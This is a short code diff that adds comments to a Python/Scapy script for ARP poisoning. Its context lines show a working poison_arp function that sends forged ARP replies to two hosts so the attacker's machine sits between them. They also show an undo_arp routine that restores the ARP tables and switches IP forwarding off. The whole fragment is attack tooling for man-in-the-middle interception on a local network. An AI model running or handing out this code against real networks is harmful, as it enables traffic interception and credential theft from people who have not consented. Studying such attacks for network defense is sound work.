@@ -8,8 +8,10 @@ def undo_arp(ip1, ip2):
     print("\n[*] Restoring Targets...")
     target1_mac = get_mac(ip1)
     target2_mac = get_mac(ip2)
+    # undo ARP tables by broadcasting previous values
     send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
     send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
+
     print("[*] Disabling IP Forwarding...")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     print("[*] Shutting Down...")
@@ -17,6 +19,7 @@ def undo_arp(ip1, ip2):
 
 
 def poison_arp(target1_mac, ip1, target2_mac, ip2):
+    # tell each value that our machine has the IP of the other, resulting a ARP update on both machine
     send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst=target1_mac))
     send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst=target2_mac))
 
